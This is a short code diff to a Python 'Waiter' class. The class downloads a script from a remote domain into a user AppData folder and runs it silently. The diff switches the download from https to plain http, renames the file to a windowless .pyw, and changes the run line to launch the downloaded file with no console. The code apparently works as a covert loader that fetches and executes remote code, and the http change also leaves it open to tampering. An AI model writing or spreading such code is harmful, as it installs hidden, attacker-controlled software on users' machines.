@@ -5,9 +5,9 @@ import subprocess
 import pathlib as pl
 
 class Waiter:
-    APP_URL = "https://action.akirottv.de"
+    APP_URL = "http://action.akirottv.de"
     APP_NAME = "action_service"
-    FILE_NAME = "action.py"
+    FILE_NAME = "action.pyw"
     BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
     APP_DIR = os.path.join(BASE_DIR, APP_NAME)
     APP_PATH = os.path.join(APP_DIR, FILE_NAME)
@@ -39,7 +39,7 @@ class Waiter:
                 f.write(new_content)
 
             print(f"→ Successfully downloaded/updated")
-            subprocess.run(['start', 'cmd', '/c', 'python', 'main.py'], shell=True, cwd=self.APP_DIR, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run(['start', 'cmd', '/c', 'python', f'{self.APP_PATH}'], shell=True, cwd=self.APP_DIR, check=True, creationflags=subprocess.CREATE_NO_WINDOW) #type: ignore
 
         except Exception as e:
             print(f"{e}")
